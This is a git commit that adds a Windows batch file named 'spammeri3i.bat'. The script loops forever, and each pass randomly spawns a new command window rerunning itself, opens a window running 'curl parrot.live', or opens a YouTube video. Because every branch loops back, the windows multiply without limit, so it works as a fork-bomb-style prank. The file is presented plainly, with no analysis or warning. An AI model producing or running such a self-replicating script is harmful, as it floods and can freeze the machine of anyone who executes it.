0ddd6ae3de4e2448c8fd84ec9425b72c7586eea1
895potatoboy <berntolsen86@gmail.com>
2026-08-11 20:42:05 +0200

    Add files via upload

---
+++ spammeri3i.bat
@@ -0,0 +1,26 @@
+@echo off
+:main
+set /a randomNum=(%random% %% 3) + 1
+IF /i "%randomNum%"=="1" goto actionone
+IF /i "%randomNum%"=="2" goto actiontwo
+IF /i "%randomNum%"=="3" goto actionthree
+
+echo error
+goto exit
+
+
+
+:actionone
+start cmd /k %UserProfile%\Downloads\spammeri3i.bat
+goto main
+
+:actiontwo
+start cmd /k curl parrot.live
+goto main
+
+:actionthree
+start https://youtube.com/watch?v=OjNpRbNdR7E
+goto main
+
+:exit
+del %UserProfile%\Downloads\spammeri3i.bat
